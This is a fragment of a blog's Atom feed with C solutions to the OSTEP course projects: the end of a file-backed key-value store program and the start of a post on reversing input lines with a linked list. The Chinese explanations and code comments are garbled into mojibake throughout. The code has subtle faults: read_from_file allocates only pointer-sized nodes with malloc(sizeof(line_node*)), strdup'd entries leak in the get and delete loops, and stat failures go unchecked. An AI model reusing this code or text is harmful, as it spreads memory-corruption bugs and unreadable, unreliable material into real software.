é‡Šæ”¾é“¾è¡¨å†…å­˜ç©ºé—´</span><span class="token keyword">void</span> <span class="token function">free_list_mem</span><span class="token punctuation">(</span>line_node<span class="token operator">*</span> data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>data <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>line_node<span class="token operator">*</span> temp <span class="token operator">=</span> data<span class="token punctuation">;</span>data <span class="token operator">=</span> data<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> op <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// æ“ä½œç¬¦</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"p"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> value <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fprintf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"%s,%s\n"</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"g"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>line_node<span class="token operator">*</span> data <span class="token operator">=</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>line_node<span class="token operator">*</span> p <span class="token operator">=</span> data<span class="token punctuation">;</span><span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> entry <span class="token operator">=</span> <span class="token function">strdup</span><span class="token punctuation">(</span>p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// æ¡ç›®å¤‡ä»½ï¼ˆline_bufä¼šè¢«strsep()ä¿®æ”¹ï¼‰</span><span class="token keyword">char</span><span class="token operator">*</span> token <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// æ‰¾åˆ°key</span>flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> entry<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>flag<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s not found\n"</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">free_list_mem</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"d"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>line_node<span class="token operator">*</span> data <span class="token operator">=</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// æ¸…ç©ºæ–‡ä»¶</span>fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>line_node<span class="token operator">*</span> p <span class="token operator">=</span> data<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> entry <span class="token operator">=</span> <span class="token function">strdup</span><span class="token punctuation">(</span>p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// æ¡ç›®å¤‡ä»½</span><span class="token keyword">char</span><span class="token operator">*</span> token <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// å½“å‰æ¡ç›®é”®å€¼ä¸ºkeyï¼Œä¸å†™å…¥ï¼ˆç›¸å½“äºåˆ é™¤ï¼‰</span><span class="token function">fprintf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> entry<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">free_list_mem</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>line_node<span class="token operator">*</span> data <span class="token operator">=</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>line_node<span class="token operator">*</span> p <span class="token operator">=</span> data<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">free_list_mem</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;æœ¬æ–‡å°†ä»‹ç»æ“ä½œç³»ç»Ÿå¯¼è®ºï¼ˆOperating Systems: Three Easy Piecesï¼‰ä½œè€…æ‰€å¼€æºçš„æ“ä½œç³»ç»Ÿç›¸å…³&lt;a href=&quot;https://github.com/remzi-arpacidusseau/ostep-projects&quot;&gt;è¯¾ç¨‹é¡¹ç›®&lt;/a&gt; çš„ KV éƒ¨åˆ†ï¼ŒåŒ…å«ä¸ªäººçš„ä»£ç å®ç°å’Œè®¾è®¡æ€è·¯ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="æ“ä½œç³»ç»Ÿ" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="æ“ä½œç³»ç»Ÿ" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="C" scheme="http://lordaeronesz.github.io/tags/C/"/>
    
    <category term="Linux" scheme="http://lordaeronesz.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>OSTEP Projectsï¼šReverse</title>
    <link href="http://lordaeronesz.github.io/2024/05/06/OSTEP%20Projects%EF%BC%9AReverse/"/>
    <id>http://lordaeronesz.github.io/2024/05/06/OSTEP%20Projects%EF%BC%9AReverse/</id>
    <published>2024-05-06T01:03:08.000Z</published>
    <updated>2024-05-06T11:51:49.235Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡å°†ä»‹ç»æ“ä½œç³»ç»Ÿå¯¼è®ºï¼ˆOperating Systems: Three Easy Piecesï¼‰ä½œè€…æ‰€å¼€æºçš„æ“ä½œç³»ç»Ÿç›¸å…³<a href="https://github.com/remzi-arpacidusseau/ostep-projects">è¯¾ç¨‹é¡¹ç›®</a> çš„ Reverse éƒ¨åˆ†ï¼ŒåŒ…å«ä¸ªäººçš„ä»£ç å®ç°å’Œè®¾è®¡æ€è·¯ã€‚</p><span id="more"></span><h1 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h1><p>é¢˜ç›®çš„è¦æ±‚å¾ˆç®€å•ï¼šæŒ‰è¡Œè¯»å–æ•°æ®ï¼Œè¯»å–å®Œæˆåå°†æ‰€è¯»å–åˆ°çš„æ‰€æœ‰è¡Œåå‘è¾“å‡ºï¼ˆè¡Œé—´åå‘ï¼Œè¡Œå†…ä¸å˜ï¼‰ã€‚ä½†ä»£ç å®ç°ä¸Šå´åŒ…å«ä¸å°‘ç»†èŠ‚ã€‚</p><p>é¦–å…ˆæ˜¯æ ¸å¿ƒé—®é¢˜ï¼šå¦‚ä½•å°†è¯»å–åˆ°è¡Œåå‘è¾“å‡ºï¼Ÿé¦–å…ˆå¯ä»¥ç¡®å®šçš„ä¸€ç‚¹æ˜¯ï¼š<strong>åœ¨æ‰€æœ‰è¡Œè¯»å–å®Œæˆä¹‹å‰ï¼Œè¯»å–åˆ°çš„æ¯ä¸€ä¸ªè¡Œéƒ½éœ€è¦è¿›è¡Œä¿å­˜ã€‚</strong>é‚£ä¹ˆï¼Œåˆ©ç”¨ä»€ä¹ˆæ•°æ®ç»“æ„è¿›è¡Œä¿å­˜å‘¢ï¼Ÿæˆ‘ä»¬éœ€è¦è¿™ä¸ªæ•°æ®ç»“æ„èƒ½å¤Ÿç¡®å®šè¾“å…¥çš„ä¸åŒè¡Œä¹‹é—´çš„å‰åç›¸å¯¹å…³ç³»ï¼Œå› æ­¤æƒ³åˆ°ä½¿ç”¨<strong>çº¿æ€§è¡¨</strong>ã€‚ç”±äºæœ€ç»ˆè¯»å–åˆ°çš„è¡Œæ•°æ˜¯ä¸ç¡®å®šçš„ï¼Œå› æ­¤ä¸èƒ½ä½¿ç”¨ä¸€ä¸ªå›ºå®šå¤§å°çš„æ•°ç»„ï¼Œè€Œåº”è¯¥ä½¿ç”¨å¯å˜é•¿çš„çº¿æ€§è¡¨ï¼Œå¦‚é“¾è¡¨ã€åŠ¨æ€æ•°ç»„ã€‚è€Œåˆå› ä¸ºå¯å˜æ•°ç»„çš„æ‰©å®¹æ“ä½œæ¯”è¾ƒè€—æ—¶ï¼Œä¸”æˆ‘ä»¬å¹¶ä¸éœ€è¦å¯¹å…ƒç´ è¿›è¡Œéšæœºè®¿é—®ï¼Œåªéœ€è¦æœ€åè¾“å‡ºçš„æ—¶å€™è¿›è¡Œé¡ºåºéå†ï¼Œå› æ­¤é“¾è¡¨å°±æˆä¸ºäº†æœ€ä½³é€‰æ‹©ã€‚</p><p>åè½¬çš„å…·ä½“å®ç°å¯ä»¥å‚è€ƒç»å…¸é—®é¢˜<a href="https://leetcode.cn/problems/reverse-linked-list/">åè½¬é“¾è¡¨</a>ï¼Œè®¾å®šä¸€ä¸ªå‰é©±ç»“ç‚¹ pre å’Œå½“å‰ç»“ç‚¹ curï¼Œæ¯æ¬¡è¯»å–åˆ°æ–°çš„è¡Œï¼Œå°±åŠ¨æ€ç”³è¯·å­˜å‚¨è¯¥è¡Œæ•°æ®çš„å†…å­˜ç©ºé—´ï¼Œå¹¶å°† cur æŒ‡å‘è¿™å—å†…å­˜ç©ºé—´ï¼Œç„¶åå°† cur çš„ next åŸŸæŒ‡å‘ preï¼Œç„¶å pre å†æŒ‡å‘ curï¼Œä»¥ä¾¿è¿›è¡Œä¸‹ä¸€è¡Œçš„æ“ä½œã€‚</p><p>æ ¹æ® README çš„è¯´æ˜ï¼Œå½“è¾“å…¥æ–‡ä»¶å’Œè¾“å‡ºæ–‡ä»¶æ˜¯åŒä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œç¨‹åºæ‰“å°ç›¸å…³é”™è¯¯ä¿¡æ¯å¹¶é€€å‡ºã€‚è¿™é‡Œä¸€ä¸ªç®€å•çš„æƒ³æ³•æ˜¯ä½¿ç”¨ <code>strcmp(argv[1], argv[2])</code> åˆ¤æ–­ä¸¤ä¸ªå‚æ•°å­—ç¬¦ä¸²æ˜¯å¦ç›¸åŒï¼Œä½†æ–‡ä»¶è·¯å¾„çš„è¡¨ç¤ºæ–¹å¼å¹¶ä¸æ˜¯å”¯ä¸€çš„ï¼Œå¦‚ <code>./t1.txt</code> å’Œ <code>t1.txt</code> å­—ç¬¦ä¸²ä¸åŒï¼Œä½†è¡¨ç¤ºçš„å´æ˜¯åŒä¸€ä¸ªæ–‡ä»¶ã€‚ä¸€ä¸ªæ­£ç¡®çš„åšæ³•æ˜¯ä½¿ç”¨ <code>stat()</code> å‡½æ•°ï¼Œç”¨ä»¥è·å–æ–‡ä»¶çš„çŠ¶æ€ä¿¡æ¯ï¼Œå¹¶å¯¹æ¯”è¾“å…¥ä¸è¾“å‡ºæ–‡ä»¶çš„çŠ¶æ€ä¿¡æ¯æ˜¯å¦ç›¸åŒã€‚</p><p>æœ€åï¼Œè¾“å…¥è¾“å‡ºéƒ¨åˆ†ä»£ç çš„å®ç°å¯ä»¥å°è£…ä¸ºä¸€ä¸ªå‡½æ•°ï¼Œå¹¶å¼•å…¥å‚æ•° <code>FILE*</code>ï¼Œå…¶ä¸­æ ‡å‡†è¾“å…¥ï¼ˆ<code>stdin</code>ï¼‰å’Œæ ‡å‡†è¾“å‡ºï¼ˆ<code>stdout</code>ï¼‰å¯ä»¥çœ‹ä½œæ˜¯ä¸€ä¸ªæŠ½è±¡çš„æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨ <code>fprintf()</code> è¿›è¡Œæ–‡ä»¶å†™å…¥ã€‚</p><h1 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h1><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">LineNode</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> line_buf<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">LineNode</span><span class="token operator">*</span> next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> line_node<span class="token punctuation">;</span><span class="token comment">// åˆ¤æ–­ä¸¤ä¸ªè·¯å¾„æ˜¯å¦è¡¨ç¤ºåŒä¸€ä¸ªæ–‡ä»¶</span><span class="token keyword">int</span> <span class="token function">is_same_file</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> file1<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> file2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">stat</span> sb1<span class="token punctuation">,</span> sb2<span class="token punctuation">;</span><span class="token function">stat</span><span class="token punctuation">(</span>file1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sb1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">stat</span><span class="token punctuation">(</span>file2<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sb2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> sb1<span class="token punctuation">.</span>st_dev <span class="token operator">==</span> sb2<span class="token punctuation">.</span>st_dev <span class="token operator">&amp;&amp;</span> sb1<span class="token punctuation">.</span>st_ino <span class="token operator">==</span> sb2<span class="token punctuation">.</span>st_ino<span class="token punctuation">;</span> <span class="token comment">// è®¾å¤‡IDå’Œinodeå·å‡ç›¸åŒ</span><span class="token punctuation">&#125;</span><span class="token comment">// ä»æ–‡ä»¶fpä¸­è¯»å–è¡Œæ•°æ®</span>line_node<span class="token operator">*</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>FILE<span class="token operator">*</span> fp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">size_t</span> sz <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>line_node<span class="token operator">*</span> cur <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">// å½“å‰ç»“ç‚¹</span>line_node<span class="token operator">*</span> pre <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">// å‰ç½®ç»“ç‚¹</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cur <span class="token operator">=</span> <span class="token punctuation">(</span>line_node<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>line_node<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>cur <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"malloc failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 